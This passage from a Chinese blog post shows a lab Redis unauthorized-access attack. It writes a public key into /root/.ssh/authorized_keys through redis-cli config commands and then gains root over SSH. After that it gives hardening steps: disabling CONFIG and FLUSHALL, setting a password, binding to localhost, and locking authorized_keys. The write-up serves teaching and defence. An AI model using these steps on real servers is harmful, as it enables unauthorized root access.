&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;info  #查看redis的信息和服务器信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;flushall 删除全部数据&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;del key  删除键为key的数据&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;get key  得到参数key的数据&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926234426901.png&#34; alt=&#34;image-20220926234426901&#34;&gt;&lt;/p&gt;
&lt;p&gt;在我们的攻击机 (kali) 上运行如下代码：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cat /home/kali/.ssh/key.txt | redis-cli -h 192.168.138.143 -x set test&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;看到回显了OK以后&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;redis-cli -h 192.168.138.143进入shell&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926222112479.png&#34; alt=&#34;image-20220926222112479&#34;&gt;&lt;/p&gt;
&lt;p&gt;将目录切换到 /root/.ssh&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;config set dir /root/.ssh&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926231146929.png&#34; alt=&#34;image-20220926231146929&#34;&gt;&lt;/p&gt;
&lt;p&gt;设置数据库名，覆盖我们的文件（保存数据库的内容到 /root/.ssh/authorized_keys ）&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;config set dbfilename authorized_keys&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;save&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926232746706.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;最后，回到生成秘钥的终端：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;使用ssh命令 以root用户的身份 连接“被攻击机”的ip&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ssh root@192.168.138.143&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220926232832651.png&#34; alt=&#34;image-20220926232832651&#34;&gt;&lt;/p&gt;
&lt;p&gt;至此，redis 提权攻击完成。&lt;/p&gt;
&lt;h2 id=&#34;0x04-修复建议安全加固&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x04-修复建议安全加固&#34;&gt;#&lt;/a&gt; 0x04 修复建议 / 安全加固&lt;/h2&gt;
&lt;h3 id=&#34;1禁止一些高危命令重启redis才能生效&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1禁止一些高危命令重启redis才能生效&#34;&gt;#&lt;/a&gt; &lt;strong&gt;1. 禁止一些高危命令&lt;/strong&gt; (重启 redis 才能生效)&lt;/h3&gt;
&lt;p&gt;修改 redis.conf 文件，添加&lt;/p&gt;
&lt;figure class=&#34;highlight yaml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;rename-command&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;FLUSHALL&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;rename-command&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;CONFIG&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;rename-command&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;EVAL&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;或者另起名字&lt;/p&gt;
&lt;figure class=&#34;highlight yaml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;rename-command&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;FLUSHALL&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;name1&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;rename-command&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;CONFIG&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;name2&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;rename-command&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;EVAL&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;name3&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;来禁用远程修改 DB 文件地址&lt;/p&gt;
&lt;h3 id=&#34;2以低权限运行-redis-服务&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2以低权限运行-redis-服务&#34;&gt;#&lt;/a&gt; &lt;strong&gt;2. 以低权限运行 Redis 服务&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;为 Redis 服务创建单独的用户和家目录，并且配置禁止登陆&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;groupadd -r redis &amp;amp;&amp;amp; useradd -r -g redis redis&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;3为-redis-添加密码验证&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3为-redis-添加密码验证&#34;&gt;#&lt;/a&gt; &lt;strong&gt;3. 为 Redis 添加密码验证&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;修改 redis.conf 文件，添加&lt;/p&gt;
&lt;figure class=&#34;highlight yaml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;requirepass&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;mypassword&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;4禁止外网访问-redis&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4禁止外网访问-redis&#34;&gt;#&lt;/a&gt; &lt;strong&gt;4. 禁止外网访问 Redis&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;修改 redis.conf 文件，添加或修改，使得 Redis 服务只在当前主机可用&lt;/p&gt;
&lt;figure class=&#34;highlight yaml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;bind&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;::1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;redis 3.2 之后，redis 增加了 protected-mode ，在这个模式下，非绑定 IP 或者没有配置密码时都会报错。&lt;/p&gt;
&lt;h3 id=&#34;5保证-authorized_keys-文件的安全&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#5保证-authorized_keys-文件的安全&#34;&gt;#&lt;/a&gt; &lt;strong&gt;5. 保证 authorized_keys 文件的安全&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;为了保证安全，您应该阻止其他用户添加新的公钥。&lt;/p&gt;
&lt;p&gt;将 authorized_keys 的权限设置为对拥有者只读，其他用户没有任何权限：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;chmod 400 ~/.ssh/authorized_keys&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;为保证 authorized_keys 的权限不会被改掉，您还需要设置该文件的 immutable 位权限：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;chattr +i ~/.ssh/authorized_keys&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;然而，用户还可以重命名～/.ssh，然后新建新的～/.ssh 目录和 authorized_keys 文件。要避免这种情况，需要设置～./ssh 的 immutable 位权限：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;chattr +i ~/.ssh&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;注意:&lt;/strong&gt; 如果需要添加新的公钥，需要移除 authorized_keys 的 immutable 位权限。然后，添加好新的公钥之后，按照上述步骤重新加上 immutable 位权限。&lt;/p&gt;
&lt;h3 id=&#34;6修改默认端口&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#6修改默认端口&#34;&gt;#&lt;/a&gt; &lt;strong&gt;6. 修改默认端口&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;修改 redis.conf 文件， 找到并修改原来的 &lt;code&gt;port 6379&lt;/code&gt;  ，比如改成 &lt;code&gt;port 17033&lt;/code&gt; ，让人摸不着头脑。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;port 17033 &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
</content>
        <category term="数据库安全" />
        <updated>2022-09-26T16:02:13.000Z</updated>
    </entry>
</feed>
